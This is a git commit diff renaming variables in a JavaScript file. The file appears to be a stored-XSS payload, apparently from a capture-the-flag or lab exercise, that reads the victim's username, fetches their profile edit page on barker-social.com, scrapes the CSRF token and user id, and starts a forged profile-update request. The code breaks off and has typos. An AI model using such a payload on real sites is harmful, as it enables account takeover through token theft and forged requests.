8c1de28664eaa385489e2e68d34628638a98b4f2
Thiyaneshwaran <52602144+th4nu-0x0@users.noreply.github.com>
2020-11-08 23:54:23 +0530

    Update js.js

--- assets/js.js
+++ assets/js.js
@@ -2,19 +2,19 @@
 const username = document.querySelector("span.navbar-text strong").innerHTML;
 
 //Removing '!' From username. 
-const userNamee = username.slice(0, -1)
+const userName = username.slice(0, -1)
 
 //Regex for finding url to extract user id. 
-const regezz = /[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)?/gi;
+const regex = /[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)?/gi;
 
 
 var req = new XMLHttpRequest();
-req.open('get',`http://barker-social.com:32880/profile/${userNamee}/edit/`,true);
+req.open('get',`http://barker-social.com:32880/profile/${userName}/edit/`,true);
 req.onload = handleResponse;
 req.send();
 function handleResponse() {
 	var token = this.responseText.match(/name="_token" value="(\w+)"/)[1];
-	var useid = this.response.match(regezz)[11];
+	var useid = this.response.match(regex)[11];
 	const uuid = useid.slice(-2);
 	var changeReq = new XmlHttpRequest();
 	changeReq.open('post', `http://barker-social.com:32880/profile/update/${$uuid}`, true);
